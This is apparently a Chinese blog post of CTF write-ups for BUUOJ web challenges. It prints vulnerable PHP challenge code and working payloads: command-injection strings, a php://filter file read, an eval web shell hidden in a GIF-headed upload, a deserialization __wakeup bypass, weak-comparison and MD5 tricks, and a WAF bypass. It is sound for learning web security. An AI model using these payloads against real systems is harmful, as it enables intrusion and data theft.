---
title: BUUOJ 之 Web 刷题记
date: 2023-09-14 13:09:00
tags: [CTF, Web]
categories: 学习
---

这学期好像没什么课，就想着学一下 Web ，于是就去 BUUOJ 上刷题了。（copilot 挺懂我）

<!--more-->

## 前言

其实一开始学 CTF 的时候就想做 Web 了，但是当时密码手快毕业了，密码也简单好学，就先学密码了。
现在密码也学了个半桶水，得着手全栈了。

## 刷题

### [GXYCTF2019]Ping Ping Ping

题目给出一个 `?ip=`，显然是让我用 `GET` 方法传参，随便传个 `1` 返回的是 ping 的结果，看来是命令执行，我习惯性后面补个 `&&ls`，结果没反应，一看 wp 原来还能用分号的，`&&` 要上一条命令执行成功才会执行下一条，而 `;` 则是不管上一条命令是否成功都会执行下一条，所以这里用 `;` 就行了。

然后难点在于正则过滤，`index.php` 内容如下：

```php
/?ip=
<pre>PING 1 (0.0.0.1): 56 data bytes
/?ip=
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

这里过滤了空格和 flag，所以不能直接 `cat flag.php`，wp 的 payload 是

```bash
?ip=127.0.0.1;cat$IFS$1`ls`
```

`$IFS` 是空格，`$1` 是第一个参数，所以这里就是 `cat flag.php index.php`，然后就能看到 flag 了。注意这里的 `$1` 会带出 `ls` 的所有结果而不仅仅是 `flag.php`。所以 `cat` 出来的是目录下所有文件。

解法二是 `echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh`，这里的 `Y2F0IGZsYWcucGhw` 是 `cat flag.php` 的 base64 编码，`-d` 是解码，然后传到 `sh` 执行。注意到 `index.php` 只过滤了 `bash`，所以这里可以用 `sh`。

### [强网杯 2019]随便注

最头疼的就是这些注入了，没学过 sql 语句，也没学过数据库。

随便填个 1 提交后返回

```sql
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}
```

从网上抄的 `1' or '1'='1` 不管用，有空再回来补。

### [SUCTF 2019]EasySQL

抄的 wp：`*,1`，也不懂，有空补。

### [极客大挑战 2019]Secret File

F12 看到

```html
<a id="master" href="./Archive_room.php" style="background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;">Oh! You found me</a>
```

转到 `Archive_room.php`，有一个按钮指向 `action.php`，点了之后是一个 302 后的 `end.php`。应该是跳到 `action.php` 然后光速重定向到 `end.php`，所以没看到 `action.php` 的内容。
用 burpsuite 抓包，发现 `action.php` 有个 `secr3t.php`，进去后是以下代码

```php
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

这时候要用 php 伪协议读取 `flag.php`，`php://filter` 是 php 伪协议，`read=convert.base64-encode/resource=` 是 base64 编码，`flag.php` 是要读取的文件，所以这里的 payload 是 `secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php`，然后把返回的 base64 解码就行了。

### [极客大挑战 2019]Http

找到藏着的标签

```html
<a style="border:none;cursor:default;" onclick="return false" href="Secret.php">氛围</a>
```

转到 `Secret.php`，按他提示依次改 Referer, User-Agent 和 X-Forwarded-For，然后就能看到 flag 了。改完后如下：

```yaml
GET /Secret.php HTTP/1.1
Host: node4.buuoj.cn:25539
Upgrade-Insecure-Requests: 1
User-Agent: "Syclover" browser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Referer: https://Sycsecret.buuoj.cn
X-Forwarded-For: localhost
```

### [极客大挑战 2019]Knife

蚁剑连上秒了。

### [极客大挑战 2019]Upload

考文件上传，只能上传图片，还过滤了 `<?`，新建一个文件写如下内容：

```html
GIF89a? <script language="php">eval($_REQUEST['a'])</script>
```

然后后缀改成 `.jpg`，上传成功，然后在 burpsuite 把后缀改成 `.phtml` 重发一遍，文件存在了 `/upload` 文件夹，用蚁剑连上去就行了。
或者上传 `.phtml`先，这时上传是失败的的，bp 抓包把 `Content-Type` 改成 `image/jpeg` 重发一遍就行了。

### [ACTF2020 新生赛]Upload

和上面的差不多，前端验证后缀，上传个 `.jpg` 然后 bp 改下后缀重发就行。

### [极客大挑战 2019]BabySQL

又是 SQL 注入，跳过。

### [极客大挑战 2019]PHP

盲猜有个 `www.zip`，下载下来看到 `unserialize`，反序列化的题。

```php
<?php
include 'flag.php';
error_reporting(0);
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function __wakeup(){
        $this->username = 'guest';
    }
    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();
        }
    }
}
?>
```

反序列化时会首先执行 `__wakeup`，然后执行 `__destruct`，但是 `__wakeup` 里把 `username` 改成了 `guest`，所以 `__destruct` 里的 `if ($this->username === 'admin')` 正常情况下永远不会成立，所以这里要绕过 `__wakeup`，在反序列化时，当前属性个数大于实际属性个数时，就会跳过 `__wakeup`，但是这个似乎是 PHP 低版本的漏洞，用高版本的 PHP 复现不出来。

```php
<?php
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
 
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
}
$a = new Name('admin', 100);
$b = urlencode(serialize($a));
echo $b; 
?>
```

出来一个 `O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D`，urlencode 前是 `O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}`，所以把 2 改成 3 就行，最终的 payload 就是 `?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`

### [ACTF2020 新生赛]BackupFile

wp 说用 dirsearch 嗯扫，我一通操作发现鸟蛋没扫出来，一看原来已经报 429 Too Many Requests，这 dirsearch 也是个笨比不知道歇会再扫。
总之就是有个 `index.php.bak`，内容如下：

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

php 里的 `==` 不要求类型相同，数字和混合字符串比较时，取最前面的一串数字，这里的 `str` 就只取 `123`，所以这里的 payload 是 `?key=123`。

### [RoarCTF 2019]Easy Calc

F12 看到说 `I've set up WAF to ensure security.`，WAF 是 Web Application Firewall 的缩写，就是一种防火墙。然后看到计算的过程是用 AJAX 发个包给 `calc.php` 去。直接访问 `calc.php`，内容如下：

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

然后发现 num 里面有字母时也会被 WAF 拦下来，比如 `?num=a` 时就不行，这时候就有个骚操作，可以在 `num` 前面加个空格或者 `+`，这样就能绕过 WAF 了，但是 PHP 在解析参数的时候会把空格或者 `+` 去掉。
那么我们 `? num=var_dump(scandir(chr(47)))` 看下目录内容，为了绕过黑名单只能用 ASCII码，`chr(47)` 就是 `/`，也就是相当于 `ls /`，看到有个 `f1agg`，用 `file_get_contents` 读出来就行，payload 为 `? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))`。

### [极客大挑战 2019]BuyFlag

MENU 跳到 `pay.php`，F12 看到源码：

```php
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    if (is_numeric($password)) {
        echo "password can't be number</br>";
    }elseif ($password == 404) {
        echo "Password Right!</br>";
    }
}
```

又要 password 不是数字，又要 password 是 404，那还是 PHP 的弱类型比较，搞个 `404a` 传过去，发现没反应，根据他的要求再 POST 个 `money` 过去，还是没反应，看 wp 才发现有个 `user` 的 cookie 要改成 1，这时有反应了，说 `money` 太长。
PHP 5.3 有个关于 `strcmp` 的漏洞，就是数据类型不同的时候，`strcmp` 会返回 0，所以这里的 payload 是 `?password=404a&money[]=1`，就是把 `money` 干成数组，就得到 flag了。

### [BJDCTF2020]Easy MD5

随便输个 `1`，一看响应头有个 hint：`Hint: select * from 'admin' where password=md5($pass,true)`，好，那就搞搞 MD5。
首先 MD5 出来的是一个 128 位的散列值，然后 PHP 的 `md5` 函数后面的 `true` 是指返回二进制格式的散列值，但是这个二进制串会进行 ASCII 码转换成字符串，类似 python 里的 `str(long_to_bytes())`。
wp 中选择了 `ffifdyop` 作为 payload，其 MD5 值为 `276f722736c95d99e921722cf9ed621c`，前面的 `27 6f 72 27 36` 对应的字符为 `'or'6`，这样就可以进行一个 SQL 注入，拼凑出 `select * from 'admin' where password=''or'6...'`，后面还会跟着一堆乱码，但是 `6...` 会被当成数字，所以就一定为真。
然后跳到了 `levels91.php`，F12 看到：

```php
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
```

`$GET` 感觉是错的，真随意。后面的 if 语句有两种方法绕过，一种是找到两个不同的字符串，其 MD5 值都是 `0e` 后面跟数字，这样的话 PHP 会当成是科学计数法，其值都为 `0`，比如 `QNKCDZO` 和 `s878926199a`，传参进去后出现如下代码：

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```

这里就要用第二种方法了，就是传俩数组进去，`md5` 函数会返回 `null`，然后 `null` 和 `null` 比较时会返回 `true`，而且这个方法刚才也能用，即弱比较和强比较通杀。

### [护网杯 2018]easy_tornado

打开一看是个目录，有 `/flag.txt`，`/welcome.txt` 和 `hints.txt`，内容分别为 `flag in /fllllllllllllag`，`render` 和 `md5(cookie_secret+md5(filename))` 打开文件的时候 url 变成了 `/file?filename=/xxx.txt&filehash=xxx`，那我想看 flag 的话应该得搞到 flag 文件的 filehash，那首先得搞到 `cookie_secret`。
题目名字中的 tornado 是一个 Python 的 web 框架，类似 Flask，那么题目是 SSTI 注入，即 Server-Side Template Injection，服务端模板注入。先只传 `filename` 不传 `filehash`，网页跳转到 `/error?msg=Error`，网页内容也是 `Error`，那么考虑对 `msg` 进行注入。
小插曲：这时候太困睡觉去了，第二天再来搞这题时 BUU 在维护了，开摆！
test
